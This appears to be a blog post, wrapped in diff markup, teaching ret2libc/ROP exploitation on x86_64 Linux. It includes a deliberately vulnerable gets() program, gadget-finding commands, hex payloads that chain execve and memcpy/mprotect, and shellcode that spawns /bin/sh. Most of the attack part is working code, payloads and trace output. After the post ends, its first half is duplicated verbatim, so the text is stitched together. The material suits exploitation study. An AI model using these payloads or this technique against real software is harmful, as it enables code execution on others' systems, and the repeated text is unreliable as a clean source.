@@ -1,0 +1,1179 @@
+RET2LIBC x86_64 EXECVE and MPROTECT + SHELLC0DE EXEC ON LINUX
+ 
+Demonstrate the use of re2libc on a modern/up-to-date x86_64 Linux system for command execution and running shell code
+ 
+===============================================================
+ 
+With the move to x86_64 and a lot of current protection mechanisms like stack protector, stack execution protection, DEP/NX protection, and ASLR, running arbitrary code is a lot harder than it used to be. The days of Aleph1 stack smashing are long gone. So, even if there has been no improvement in code quality and you find your bugs, exploiting them has got substantially harder, just because of the platform you're running on.
+ 
+This post looks at ret2libc ("pop pop ret") to run commands without executing shell code, as well as using ret2libc to copy shell code into a memory area, defeat DEP/NX and run it.
+ 
+The machine I am running this on is a recent x86_64 desktop running a Ubuntu-based distribution.
+ 
+# uname -a
+Linux bt 3.2.6 #1 SMP Fri Feb 17 10:34:20 XXX 2012 x86_64 GNU/Linux
+# lsb_release -a
+No LSB modules are available.
+Distributor ID: Ubuntu
+Description:    Ubuntu 10.04.3 LTS
+Release:        10.04
+Codename:       lucid
+ 
+By default, this has stack protection on (unless explicitly instructing gcc to not use it), allows no code execution on the stack, uses ASLR as well as DEP/NX.
+ 
+For this purpose, we're turning off stack protection (which inserts "stack cookies" to ensure stack integrity) as well as ASLR, because it makes it much harder, while not adding a lot to the explanation of concepts. Perhaps in a later post I'll talk about these two as well.
+ 
+I got a lot of info from the link below, but I never got his actual example with a <system> call working, so this takes a slightly different approach:
+ 
+1. use execve syscall through ret2libc
+2. use <memcpy> libc function and mprotect syscall to execute inserted shellcode.
+ 
+Link: http://crypto.stanford.edu/~blynn/rop/
+-----------------------------------------------------------------
+ 
+For this exercise, we'll use some pretty basic C code as the victim. (you'll notice it is very similar to the code in the link):
+ 
+--
+ 
+#include <stdio.h>
+int main(){
+        char name[64];
+        printf("buffer address: %p\n", name);  //print address of buffer
+        puts("Enter text for name:");
+        gets(name);
+        printf("content of buffer: %s\n", name);
+        return 0;
+}
+ 
+--
+ 
+This is obviously bad code. Even gcc gives a warning. Note, this is compiled with the -fno-stack-protector flag. We'll leave "execstack" on, though. (you can make sure it's on with # execstack -c victim).
+ 
+If not already obvious, this code is vulnerable to a stack overflow. If you provide an input string larger than 64 characters, the name buffer is overflowed, and we overwrite the return address. That gives us control over the instruction pointer.
+ 
+To make our life a little easier, we're printing out the buffer address. This proved useful in the end, since gdb adds some stack space itself, and between running in gdb and running interactively, there proved to be a 0x20 difference in buffer address. (That took me a while to realize…)
+ 
+------------------------------------------------------------------
+ 
+*******************************
+ 
+1. EXECVE SYSCALL with ret2libc
+ 
+*******************************
+ 
+For the first exercise the plan is to simply execute /bin/sh (/bin/bash). In the link above, the jump is to <system> function call, but that didn't work for me, and it looks some protection is built in (it basically replaces the %rdi value with a strange low hex value). Here, then, we set up all the registers ourselves and jump to <execve>, which does little more than setting %rax to the right syscall number and the syscall itself.
+ 
+A quick reminder of x86_64 linux syscall convention: %rax holds the syscall and parameters are passed in registers:
+ 
+%rdi    <- param 1
+%rsi    <- param 2
+%rdx    <- param 3
+%rcx    <- param 4
+%r8     <- param 5
+%r9     <- param 6
+ 
+No parameters are passed (directly) on the stack (unless we reference a structure, which may be a pointer to space on the stack).
+ 
+execve takes 3 parameters:
+ 
+        int execve(const char *filename, char *const argv [], char *const envp[]);
+ 
+The first parameter is the filename (/bin/sh in our case). argv should be a structure (you can read the man page), but passing null here works just as well, and we can leave envp null as well.
+ 
+so, we need to achieve the following:
+ 
+%rdi    <- "/bin/sh" (note, null terminated)
+%rsi    <- null/0x00
+%rdx    <- null/0x00
+ 
+%rax will be set to 0x3b (59) when execution is directed to <execve> libc function.
+ 
+Disassembled victim code:
+ 
+--
+ 
+00000000004005b4 <main>:
+  4005b4:       55                      push   %rbp
+  4005b5:       48 89 e5                mov    %rsp,%rbp
+  4005b8:       48 83 ec 40             sub    $0x40,%rsp
+  4005bc:       b8 fc 06 40 00          mov    $0x4006fc,%eax
+  4005c1:       48 8d 55 c0             lea    -0x40(%rbp),%rdx
+  4005c5:       48 89 d6                mov    %rdx,%rsi
+  4005c8:       48 89 c7                mov    %rax,%rdi
+  4005cb:       b8 00 00 00 00          mov    $0x0,%eax
+  4005d0:       e8 bb fe ff ff          callq  400490 <printf@plt>
+  4005d5:       bf 10 07 40 00          mov    $0x400710,%edi
+  4005da:       e8 c1 fe ff ff          callq  4004a0 <puts@plt>
+  4005df:       48 8d 45 c0             lea    -0x40(%rbp),%rax
+  4005e3:       48 89 c7                mov    %rax,%rdi
+  4005e6:       e8 d5 fe ff ff          callq  4004c0 <gets@plt>
+  4005eb:       b8 25 07 40 00          mov    $0x400725,%eax
+  4005f0:       48 8d 55 c0             lea    -0x40(%rbp),%rdx
+  4005f4:       48 89 d6                mov    %rdx,%rsi
+  4005f7:       48 89 c7                mov    %rax,%rdi
+  4005fa:       b8 00 00 00 00          mov    $0x0,%eax
+  4005ff:       e8 8c fe ff ff          callq  400490 <printf@plt>
+  400604:       b8 00 00 00 00          mov    $0x0,%eax
+  400609:       c9                      leaveq
+  40060a:       c3                      retq  
+  40060b:       90                      nop
+  40060c:       90                      nop
+ 
+--
+ 
+There is a "leaveq" and a "retq".
+leaveq does this:
+ 
+mov %rbp, %rsp
+pop %rbp
+ 
+retq returns to the "calling function", pops the next address off the stack and directs execution there.
+ 
+Stack lay-out:
+ 
+        -----------------
+        | buffer (name) |
+        |               |
+        |   64 bytes    |
+        |               |
+        |---------------|
+        |  saved %rbp   |
+        |---------------|
+        |  saved ret    |
+        |---------------|
+        |  older stack  |
+        |     . . .     |
+ 
+ 
+RET2LIBC refers to jumping to instructions within libc (loaded with victim, because of the inclusion of the <stdio.h> header), either code fragments, or function calls (which often, but not always, are interfaces to sys calls). So, since we cannot execute any code directly, we jump to code that _is_ executable.
+ 
+Since we fully control %rip (and probably quite a bit of stack after that), we can send execution anywhere we want. Since we need to pass 3 parameters, we need something for %rdi, %rsi and %rdx. And since this will need to be chained (eventually everything needs to end up in <execve>, we will need to return, as well.
+ 
+RET2LIBC is also referred to as POP POP RET. And here's why: what we'll do is find code that does:
+ 
+pop %rdi
+retq
+pop %rsi
+retq
+pop %rdx
+retq
+<execve>
+ 
+ 
+These individual 'pop-rets' are usually referred to as "gadgets". They will allow us to jump around the code. So, we need to find memory addresses to give us this.
+ 
+This is where the article linked above was very useful. We can grep through libc for retq, but that's a lot of stuff to go through. If we know what the actual hex opcodes are, we can look for them directly. To make this easy, I wrote a real quick bit of assembly that pushed some stuff to the stack, then pops rdi, rsi, rex, dcx, r9 and r8.
+ 
+  600084:       5f                      pop    %rdi
+  600085:       5e                      pop    %rsi
+  600086:       5a                      pop    %rdx
+  600087:       59                      pop    %rcx
+  600088:       41 59                   pop    %r9
+  60008a:       41 58                   pop    %r8
+ 
+Nicely, all the main register "pops" are just a single byte.
+ 
+We can now look for "pop %rdi - retq" by bytes:
+# locate libc.so
+/lib/libc.so.6
+/lib32/libc.so.6
+/opt/AutoScan/usr/lib/libc.so
+/opt/AutoScan/usr/lib/libc.so.6
+/usr/lib/libc.so
+# xxd -c1 -p /lib/libc.so.6 | grep -n -B1 c3 | grep 5f | awk '{printf"%x\n",$1-1}'
+2028b
+22a3e
+233fa
+23a77
+248cf
+254b9
+25d54
+261f1
+2675e
+27047
+277e4
+27b71
+280f8
+28761
+290cd
+...
+ 
+Note: when doing this on your own machine, results will be different. If following along, follow the logic, don't just copy/paste commands.
+ 
+This basically gives us a sequence of offset addresses since the beginning of libc with byte sequences matching 5f c3 (retq).
+ 
+We can get the address in memory of libc by running victim and grepping proc/$pid/maps in a different shell window:
+ 
+(Note, in another shell run: setarch `arch` -R ./victim   -- setarch `arch` -R disables ASLR)
+ 
+# ps -ef | grep victim
+root     28258 28233  0 13:21 pts/3    00:00:00 ./victim
+root     28262 26527  0 13:21 pts/1    00:00:00 grep --color=auto victim
+# grep libc /proc/28258/maps
+7ffff7a57000-7ffff7bd4000 r-xp 00000000 08:05 46534885                   /lib/libc-2.11.1.so
+7ffff7bd4000-7ffff7dd3000 ---p 0017d000 08:05 46534885                   /lib/libc-2.11.1.so
+7ffff7dd3000-7ffff7dd7000 r--p 0017c000 08:05 46534885                   /lib/libc-2.11.1.so
+7ffff7dd7000-7ffff7dd8000 rw-p 00180000 08:05 46534885                   /lib/libc-2.11.1.so
+ 
+So, libc (executable) lives at 0x00007ffff7a57000
+ 
+pick one of the offsets above, and simply add it to the libc address, and we have our first gadget!
+ 
+We do exactly the same for pop %rsi and pop %rdx. Finally, we need to find the offset for the <execve> function:
+ 
+# nm -D /lib/libc.so.6 | grep '\<execve\>'
+00000000000acf80 W execve
+ 
+ 
+We do the same as before, we just add this to the libc base address:
+ 
+# printf %016x $((0x7ffff7a57000+0xacf80)) | tac -rs..
+803fb0f7ff7f0000
+ 
+(note, we need this in reverse order)
+ 
+The same printf command is also used to calculate the addresses for our pop-ret gadgets.
+ 
+We place /bin/sh at the beginning of our buffer, and place the addresses and their values appropriately, which results in the following input string:
+ 
+2f62696e2f7368000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000d0e5ffffff7f0000cfb8a7f7ff7f0000d0e5ffffff7f0000187baaf7ff7f00000000000000000000928ba5f7ff7f00000000000000000000803fb0f7ff7f0000
+ 
+I then turn this to binary with xxd -r -p and feed it into victim:
+ 
+This results in the following stack:
+ 
+        -----------------------
+        |    /bin/sh + 00s    |
+        |                     |
+        |      64 bytes       |
+        |                     |
+        |---------------------|
+        | 0x00007fffffffe5d0  |  <-- buffer address, will be %rbp
+        |---------------------|
+        | 0x00007ffff7a7b8cf  |  <-- libc: pop %rdi-ret
+        |---------------------|
+        | 0x00007fffffffe5d0  |  <-- buffer address: val of %rdi
+        |---------------------|
+        | 0x00007ffff7aa7b18  |  <-- libc: pop %rsi-ret
+        |---------------------|
+        | 0x0000000000000000  |  <-- null: val of %rsi
+        |---------------------|
+        | 0x00007ffff7a58b92  |  <-- libc: pop %rdx-ret
+        |---------------------|
+        | 0x0000000000000000  |  <-- null: val of %rdx
+        |---------------------|
+        | 0x00007ffff7b03f80  |  <-- libc: <execve>
+        |      . . .          |
+ 
+ 
+So, does this work? It does, but with some caveats. The thing that really messed with my head was that it would work in gdb, but then wouldn't work outside of it. Once I realized that gdb added 0x20 to the stack itself, between running interactive and through gdb I had to adjust offsets. The second thing is that while it runs, you don't actually get the shell you expect, you just get back to the command prompt. Not that that's a terrible thing here, all we're trying to do here is prove that we can do this, and the code is somewhat irrelevant. Running strace, we can see that we indeed executed /bin/bash, though:
+ 
+[    7ffff7b3c51a] mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7ffff7ff7000
+[    7ffff7b31f90] read(0, "/bin/sh\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 4096) = 128
+[    7ffff7b31f90] read(0, "", 4096)    = 0
+[    7ffff7b31ff0] write(1, "content of buffer: /bin/sh\n", 27content of buffer: /bin/sh
+) = 27
+[    7ffff7b03f87] execve("/bin/sh", [0], [0]) = 0
+[    7ffff7df3fca] brk(0)               = 0x6ea000
+ 
+…
+ 
+[    7ffff76ea325] stat("/usr/local/sbin/bash", 0x7fffffffe9b0) = -1 ENOENT (No such file or directory)
+[    7ffff76ea325] stat("/usr/local/bin/bash", 0x7fffffffe9b0) = -1 ENOENT (No such file or directory)
+[    7ffff76ea325] stat("/usr/sbin/bash", 0x7fffffffe9b0) = -1 ENOENT (No such file or directory)
+[    7ffff76ea325] stat("/usr/bin/bash", 0x7fffffffe9b0) = -1 ENOENT (No such file or directory)
+[    7ffff76ea325] stat("/sbin/bash", 0x7fffffffe9b0) = -1 ENOENT (No such file or directory)
+[    7ffff76ea325] stat("/bin/bash", {st_dev=makedev(8, 5), st_ino=262149, st_mode=S_IFREG|0755, st_nlink=1, st_uid=0, st_gid=0, st_blksize=4096, st_blocks=1832, st_size=934336, st_atime=2013/03/03-13:17:02, st_mtime=2010/04/18-19:16:01, st_ctime=2012/05/28-17:30:45}) = 0
+[    7ffff76ea325] stat("/bin/bash", {st_dev=makedev(8, 5), st_ino=262149, st_mode=S_IFREG|0755, st_nlink=1, st_uid=0, st_gid=0, st_blksize=4096, st_blocks=1832, st_size=934336, st_atime=2013/03/03-13:17:02, st_mtime=2010/04/18-19:16:01, st_ctime=2012/05/28-17:30:45}) = 0
+[    7ffff76bdad7] geteuid()            = 0
+[    7ffff76bdaf7] getegid()            = 0
+[    7ffff76bdac7] getuid()             = 0
+[    7ffff76bdae7] getgid()             = 0
+[    7ffff76eb047] access("/bin/bash", X_OK) = 0
+[    7ffff76ea325] stat("/bin/bash", {st_dev=makedev(8, 5), st_ino=262149, st_mode=S_IFREG|0755, st_nlink=1, st_uid=0, st_gid=0, st_blksize=4096, st_blocks=1832, st_size=934336, st_atime=2013/03/03-13:17:02, st_mtime=2010/04/18-19:16:01, st_ctime=2012/05/28-17:30:45}) = 0
+ 
+…
+ 
+Very good! It does actually work. (you can see the write back to stdout with the buffer contents, followed by the execve syscall)
+ 
+ 
+IMPORTANT: In x86_64, we're passing 8 byte addresses and cannot shorten it. ALL MEMORY ADDRESSES HAVE AT LEAST TWO NULL BYTES. Therefore, let's forget about null-free input…
+ 
+--------------------------------------------
+ 
+********************************
+ 
+2. RET2LIBC MPROTECT + SHELLCODE
+ 
+********************************
+ 
+Now, this is nice, but what I _really_ like is run my own shell code of choice. We can endlessly chain pop-ret if we want to, but at 8 bytes for each instruction/gadget, that quickly gets quite large. If we can use ret2libc just for a first stage and then get some code executed, we can do a lot more.
+ 
+So far we've "defeated" NX by simply never attempting to run any inserted code. We'll _actually_ have to defeat it if we want to run arbitrary code.
+ 
+To test shell code, I typically use this bit of C:
+ 
+--
+ 
+int main(int argc, char **argv) {
+ 
+    void *ptr = mmap(0, sizeof(shellcode),
+            PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON
+            | MAP_PRIVATE, -1, 0);
+ 
+    if (ptr == MAP_FAILED) {
+        perror("mmap");
+        exit(-1);
+    }
+ 
+    memcpy(ptr, shellcode, sizeof(shellcode));
+    sc = ptr;
+ 
+    sc();
+ 
+    return 0;
+}
+ 
+--
+ 
+So, we should be able to do a similar thing as above and chain gadgets to mmap an area, memcpy the shell code into it, and direct execution there.
+ 
+One problem… (And this took a while to figure out) mmap takes 6 parameters:
+ 
+        void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
+ 
+This wouldn't be a problem if it were easy to find pop %r8 and pop %r9 near a ret, or something equivalent, but multiple searches through libc with either grep or xxd showed this was a dead end. 41-59-c3 and 41-58-c3 simply don't exist in (my) libc, and grepping objdump doesn't give us anything useful. So, we need a different plan.
+ 
+Rather than mmapping a location directly to PROT_EXEC | PROT_WRITE | PROT_READ and then copying, we can copy first to a data section, and then run mprotect to change the permissions.
+ 
+ 
+        void *memcpy(void *dest, void *src, size_t count);
+        int mprotect(const void *addr, size_t len, int prot);
+ 
+We need to find an area to copy to. With readelf we can find relevant sections:
+ 
+  [19] .ctors            PROGBITS        0000000000600e18 000e18 000010 00  WA  0   0  8
+  [20] .dtors            PROGBITS        0000000000600e28 000e28 000010 00  WA  0   0  8
+  [21] .jcr              PROGBITS        0000000000600e38 000e38 000008 00  WA  0   0  8
+  [22] .dynamic          DYNAMIC         0000000000600e40 000e40 0001a0 10  WA  7   0  8
+  [23] .got              PROGBITS        0000000000600fe0 000fe0 000008 08  WA  0   0  8
+  [24] .got.plt          PROGBITS        0000000000600fe8 000fe8 000038 08  WA  0   0  8
+  [25] .data             PROGBITS        0000000000601020 001020 000010 00  WA  0   0  8
+  [26] .bss              NOBITS          0000000000601030 001030 000010 00  WA  0   0  8
+  [27] .comment          PROGBITS        0000000000000000 001030 000025 01  MS  0   0  1
+ 
+ 
+I decided to pick 0x601040. So, this is where we will write the shellcode. This is a rw- memory area (W=write; A=access), so writing shouldn't be a problem. Then, with mprotect we will set it to executable. For mprotect, I found out the hard way that this works on a whole page, and once I realized what that actually meant 0x601000 will be the address we pass to mprotect. That will then also apply to the .data and .bss sections.
+ 
+----------------------------------
+PROT_EXEC | PROT_WRITE | PROT_READ
+ 
+This works just like rwx on the file system, so 7 = rwx, 5 = r-x, 6 = rw-, etc.
+ 
+I tried both 7 and 5, and both worked on my system. Some implementations apparently check whether W is set as well as X and don't allow that, so 5 is the cleaner option, unless your shell code needs to write further data, of course (but you could use the stack for that as well).
+----------------------------------
+ 
+Both memcpy and mprotect are three parameter functions, so we can reuse our previously found gadgets. (Though pop %rdx just happens to be another one)
+ 
+OK, some shellcode. This essentially does the same thing as we did before: run an execve to /bin/sh. Again, I'll just use null, null for the argv and envy params.
+ 
+--
+ 
+[bits 64]
+global _start
+ 
+section .data
+command db "/bin/sh", 0x00
+; 8 chars
+ 
+_start:
+        xor eax, eax
+        xor esi, esi
+        xor edi, edi
+        xor edx, edx
+ 
+popshell:
+        mov al,0x3b
+        lea rdi, [rel command]
+        syscall
+        call _start
+exit:
+        xor eax, eax
+        mov al, 60
+        xor edi, edi
+        syscall
+ 
+        nop
+        nop
+        nop
+        nop
+        nop
+ 
+--
+ 
+/bin/sh is loaded from a [rel command] so the address is relative (and negative, so no nulls, even though that doesn't matter here). The exit syscall here is redundant because it is never reached. The call was with the idea that if an error occurred it would be able to recover by looping back up, but that isn't actually how execve works, so could also be cut.
+ 
+0000000000600078 <command>:
+  600078:       2f                      (bad)  
+  600079:       62                      (bad)  
+  60007a:       69 6e 2f 73 68 00 31    imul   $0x31006873,0x2f(%rsi),%ebp
+ 
+0000000000600080 <_start>:
+  600080:       31 c0                   xor    %eax,%eax
+  600082:       31 f6                   xor    %esi,%esi
+  600084:       31 ff                   xor    %edi,%edi
+  600086:       31 d2                   xor    %edx,%edx
+ 
+0000000000600088 <popshell>:
+  600088:       b0 3b                   mov    $0x3b,%al
+  60008a:       48 8d 3d e7 ff ff ff    lea    -0x19(%rip),%rdi        # 600078 <command>
+  600091:       0f 05                   syscall
+  600093:       e8 e8 ff ff ff          callq  600080 <_start>
+ 
+0000000000600098 <exit>:
+  600098:       31 c0                   xor    %eax,%eax
+  60009a:       b0 3c                   mov    $0x3c,%al
+  60009c:       31 ff                   xor    %edi,%edi
+  60009e:       0f 05                   syscall
+  6000a0:       90                      nop
+  6000a1:       90                      nop
+  6000a2:       90                      nop
+  6000a3:       90                      nop
+  6000a4:       90                      nop
+ 
+Without the nops, that is 40 characters. We should have 64 chars at least for size, and +16 if we don't care about the stack base pointer. The effective code here is 26 bytes (without the call and exit), so 64 would allow us quite a few more actions, especially if we do standard de-nulling.
+ 
+The bytes under <command> stand for /bin/sh, 0x00. Because of the null byte, the rest of the shell code will not be echoed to the screen when victim prints the buffer. You can also see that command is 0x19 back from %rip when its address is loaded.
+ 
+For our pop-ret chain, we do have to remember to jump to <_start> at <command>+0x08 to jump into executable code, rather than the top of our base address. (If you don't, you start executing the /bin/sh bytes 2f, 62, etc. which give you an bad instruction error)
+ 
+xxd -s0x78 -l40 -p the compiled code to generate the shell code. This will go at the start of our input string.
+ 
+2f62696e2f73680031c031f631ff31d2b03b488d3de7ffffff0f05e8e8ffffff31c0b03c31ff0f05
+ 
+This is what the stack will look right after the get function in victim:
+ 
+        -----------------------
+        | 2f62696e2f73680031..|  <-- /bin/sh, 0x00 + executable shellcode
+        |                     |
+        |       64 bytes      |
+        |(filled up with 0x00)|
+        |---------------------|
+        | 0x00007fffffffe5d0  |  <-- %rbp (upon leave)
+        |---------------------|
+        | 0x00007ffff7a7b8cf  |  <-- libc: pop %rdi-ret
+        |---------------------|
+        | 0x0000000000601040  |  <-- start of mem to write to (dest): val of %rdi
+        |---------------------|
+        | 0x00007ffff7aa7b18  |  <-- libc: pop %rsi-ret
+        |---------------------|
+        | 0x00007fffffffe5d0  |  <-- buffer to copy from (src): val of $rsi
+        |---------------------|
+        | 0x00007ffff7aa32d2  |  <-- libc: pop %rdx-ret
+        |---------------------|
+        | 0x0000000000000028  |  <-- length to copy: 40 (0x28): val of %rdx
+        |---------------------|
+        | 0x00007ffff7adf290  |  <-- libc: <memcpy>
+        |---------------------|
+        | 0x00007ffff7a7b8cf  |  <-- libc: pop %rdi-ret
+        |---------------------|
+        | 0x0000000000601000  |  <-- top of page to mprotect: val of %rdi
+        |---------------------|
+        | 0x00007ffff7aa7b18  |  <-- libc: pop %rsi-ret
+        |---------------------|  
+        | 0x0000000000001000  |  <-- page size: val of %rsi
+        |---------------------|
+        | 0x00007ffff7aa32d2  |  <-- libc: pop %rdx-ret
+        |---------------------|
+        | 0x0000000000000005  |  <-- r-x: val of %rdx
+        |---------------------|
+        | 0x00007ffff7b3c570  |  <-- libc: <mprotect>
+        |---------------------|
+        | 0x0000000000601048  |  <-- direct to executable shell code (+0x08)
+        |---------------------|
+        | 0xacabacabacabacab  |  <-- marker/signature
+        |---------------------|
+        |                     |
+        |        . . .        |
+ 
+ 
+Full hex input string:
+2f62696e2f73680031c031f631ff31d2b03b488d3de7ffffff0f05e8e8ffffff31c0b03c31ff0f05000000000000000000000000000000000000000000000000d0e5ffffff7f0000cfb8a7f7ff7f00004010600000000000187baaf7ff7f0000d0e5ffffff7f0000d232aaf7ff7f0000280000000000000090f2adf7ff7f0000cfb8a7f7ff7f00000010600000000000187baaf7ff7f00000010000000000000d232aaf7ff7f0000050000000000000070c5b3f7ff7f00004810600000000000abacabacabacabac
+ 
+I save this in a file called mprot.ascii, and then convert to binary:
+ 
+# xxd -r -p mprot.ascii mprot
+ 
+I then run the exploit by cat'ing the file into the victim program.
+ 
+--
+ 
+# cat mprot | setarch `arch` -R ./victim
+buffer address: 0x7fffffffe5d0
+Enter text for name:
+content of buffer: /bin/sh
+#
+ 
+--
+ 
+Again, we don't actually get a shell, but we can check with strace again whether /bin/bash is actually started. And it is. Also note the call to mprotect(0x601000, 4096, PROT_READ|PROT_EXEC) = 0 right before /bin/sh is executed:
+ 
+ 
+[    7ffff7b3c51a] mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7ffff7ff7000
+[    7ffff7b31f90] read(0, "/bin/sh\0001\3001\3661\3771\322\260;H\215=\347\377\377\377\17\5\350\350\377\377\377"..., 4096) = 200
+[    7ffff7b31f90] read(0, "", 4096)    = 0
+[    7ffff7b31ff0] write(1, "content of buffer: /bin/sh\n", 27content of buffer: /bin/sh
+) = 27
+[    7ffff7b3c577] mprotect(0x601000, 4096, PROT_READ|PROT_EXEC) = 0
+[          60105b] execve("/bin/sh", [0], [0]) = 0
+[    7ffff7df3fca] brk(0)               = 0x6ea000
+ 
+…
+ 
+[    7ffff76ea325] stat("/usr/local/sbin/bash", 0x7fffffffe9b0) = -1 ENOENT (No such file or directory)
+[    7ffff76ea325] stat("/usr/local/bin/bash", 0x7fffffffe9b0) = -1 ENOENT (No such file or directory)
+[    7ffff76ea325] stat("/usr/sbin/bash", 0x7fffffffe9b0) = -1 ENOENT (No such file or directory)
+[    7ffff76ea325] stat("/usr/bin/bash", 0x7fffffffe9b0) = -1 ENOENT (No such file or directory)
+[    7ffff76ea325] stat("/sbin/bash", 0x7fffffffe9b0) = -1 ENOENT (No such file or directory)
+[    7ffff76ea325] stat("/bin/bash", {st_dev=makedev(8, 5), st_ino=262149, st_mode=S_IFREG|0755, st_nlink=1, st_uid=0, st_gid=0, st_blksize=4096, st_blocks=1832, st_size=934336, st_atime=2013/03/03-13:17:02, st_mtime=2010/04/18-19:16:01, st_ctime=2012/05/28-17:30:45}) = 0
+[    7ffff76ea325] stat("/bin/bash", {st_dev=makedev(8, 5), st_ino=262149, st_mode=S_IFREG|0755, st_nlink=1, st_uid=0, st_gid=0, st_blksize=4096, st_blocks=1832, st_size=934336, st_atime=2013/03/03-13:17:02, st_mtime=2010/04/18-19:16:01, st_ctime=2012/05/28-17:30:45}) = 0
+[    7ffff76bdad7] geteuid()            = 0
+[    7ffff76bdaf7] getegid()            = 0
+[    7ffff76bdac7] getuid()             = 0
+[    7ffff76bdae7] getgid()             = 0
+[    7ffff76eb047] access("/bin/bash", X_OK) = 0
+[    7ffff76ea325] stat("/bin/bash", {st_dev=makedev(8, 5), st_ino=262149, st_mode=S_IFREG|0755, st_nlink=1, st_uid=0, st_gid=0, st_blksize=4096, st_blocks=1832, st_size=934336, st_atime=2013/03/03-13:17:02, st_mtime=2010/04/18-19:16:01, st_ctime=2012/05/28-17:30:45}) = 0
+…
+ 
+ 
+/bin/bash executed.
+ 
+So, we know that the shell code was executed, but we can also check what happened to our data page. Before we checked /proc/$pid/maps to check the in-memory location of libc, we can do the same to get everything:
+ 
+Before (at program start):
+ 
+# cat /proc/24034/maps
+00400000-00401000 r-xp 00000000 08:05 9699676                            /xx/xx/xx/victim
+00600000-00601000 r--p 00000000 08:05 9699676                            /xx/xx/xx/victim
+00601000-00602000 rw-p 00001000 08:05 9699676                            /xx/xx/xx/victim
+7ffff7a57000-7ffff7bd4000 r-xp 00000000 08:05 46534885                   /lib/libc-2.11.1.so
+7ffff7bd4000-7ffff7dd3000 ---p 0017d000 08:05 46534885                   /lib/libc-2.11.1.so
+7ffff7dd3000-7ffff7dd7000 r--p 0017c000 08:05 46534885                   /lib/libc-2.11.1.so
+…
+ 
+After (at 0x601048):
+ 
+# cat /proc/24034/maps
+00400000-00401000 r-xp 00000000 08:05 9699676                            /xx/xx/xx/victim
+00600000-00601000 r--p 00000000 08:05 9699676                            /xx/xx/xx/victim
+00601000-00602000 r-xp 00001000 08:05 9699676                            /xx/xx/xx/victim
+7ffff7a57000-7ffff7bd4000 r-xp 00000000 08:05 46534885                   /lib/libc-2.11.1.so
+7ffff7bd4000-7ffff7dd3000 ---p 0017d000 08:05 46534885                   /lib/libc-2.11.1.so
+7ffff7dd3000-7ffff7dd7000 r--p 0017c000 08:05 46534885                   /lib/libc-2.11.1.so
+…
+ 
+00400000-00401000 is the code section
+00600000-00601000 program stuff: .ctors, .dtors, .got, .got.plt, etc.
+00601000-00602000 data section
+ 
+i.e.:
+Before: 00601000-00602000 rw-p 00001000 08:05 9699676                            /xx/xx/xx/victim
+After:  00601000-00602000 r-xp 00001000 08:05 9699676                            /xx/xx/xx/victim
+ 
+=====================================================
+ 
+
+    This proves the ret2libc/poppopret concept. In order to make all of this really useful, we'll also have to deal with stack protection and ASLR. Perhaps another time … ;)
+RET2LIBC x86_64 EXECVE and MPROTECT + SHELLC0DE EXEC ON LINUX
+ 
+Demonstrate the use of re2libc on a modern/up-to-date x86_64 Linux system for command execution and running shell code
+ 
+===============================================================
+ 
+With the move to x86_64 and a lot of current protection mechanisms like stack protector, stack execution protection, DEP/NX protection, and ASLR, running arbitrary code is a lot harder than it used to be. The days of Aleph1 stack smashing are long gone. So, even if there has been no improvement in code quality and you find your bugs, exploiting them has got substantially harder, just because of the platform you're running on.
+ 
+This post looks at ret2libc ("pop pop ret") to run commands without executing shell code, as well as using ret2libc to copy shell code into a memory area, defeat DEP/NX and run it.
+ 
+The machine I am running this on is a recent x86_64 desktop running a Ubuntu-based distribution.
+ 
+# uname -a
+Linux bt 3.2.6 #1 SMP Fri Feb 17 10:34:20 XXX 2012 x86_64 GNU/Linux
+# lsb_release -a
+No LSB modules are available.
+Distributor ID: Ubuntu
+Description:    Ubuntu 10.04.3 LTS
+Release:        10.04
+Codename:       lucid
+ 
+By default, this has stack protection on (unless explicitly instructing gcc to not use it), allows no code execution on the stack, uses ASLR as well as DEP/NX.
+ 
+For this purpose, we're turning off stack protection (which inserts "stack cookies" to ensure stack integrity) as well as ASLR, because it makes it much harder, while not adding a lot to the explanation of concepts. Perhaps in a later post I'll talk about these two as well.
+ 
+I got a lot of info from the link below, but I never got his actual example with a <system> call working, so this takes a slightly different approach:
+ 
+1. use execve syscall through ret2libc
+2. use <memcpy> libc function and mprotect syscall to execute inserted shellcode.
+ 
+Link: http://crypto.stanford.edu/~blynn/rop/
+-----------------------------------------------------------------
+ 
+For this exercise, we'll use some pretty basic C code as the victim. (you'll notice it is very similar to the code in the link):
+ 
+--
+ 
+#include <stdio.h>
+int main(){
+        char name[64];
+        printf("buffer address: %p\n", name);  //print address of buffer
+        puts("Enter text for name:");
+        gets(name);
+        printf("content of buffer: %s\n", name);
+        return 0;
+}
+ 
+--
+ 
+This is obviously bad code. Even gcc gives a warning. Note, this is compiled with the -fno-stack-protector flag. We'll leave "execstack" on, though. (you can make sure it's on with # execstack -c victim).
+ 
+If not already obvious, this code is vulnerable to a stack overflow. If you provide an input string larger than 64 characters, the name buffer is overflowed, and we overwrite the return address. That gives us control over the instruction pointer.
+ 
+To make our life a little easier, we're printing out the buffer address. This proved useful in the end, since gdb adds some stack space itself, and between running in gdb and running interactively, there proved to be a 0x20 difference in buffer address. (That took me a while to realize…)
+ 
+------------------------------------------------------------------
+ 
+*******************************
+ 
+1. EXECVE SYSCALL with ret2libc
+ 
+*******************************
+ 
+For the first exercise the plan is to simply execute /bin/sh (/bin/bash). In the link above, the jump is to <system> function call, but that didn't work for me, and it looks some protection is built in (it basically replaces the %rdi value with a strange low hex value). Here, then, we set up all the registers ourselves and jump to <execve>, which does little more than setting %rax to the right syscall number and the syscall itself.
+ 
+A quick reminder of x86_64 linux syscall convention: %rax holds the syscall and parameters are passed in registers:
+ 
+%rdi    <- param 1
+%rsi    <- param 2
+%rdx    <- param 3
+%rcx    <- param 4
+%r8     <- param 5
+%r9     <- param 6
+ 
+No parameters are passed (directly) on the stack (unless we reference a structure, which may be a pointer to space on the stack).
+ 
+execve takes 3 parameters:
+ 
+        int execve(const char *filename, char *const argv [], char *const envp[]);
+ 
+The first parameter is the filename (/bin/sh in our case). argv should be a structure (you can read the man page), but passing null here works just as well, and we can leave envp null as well.
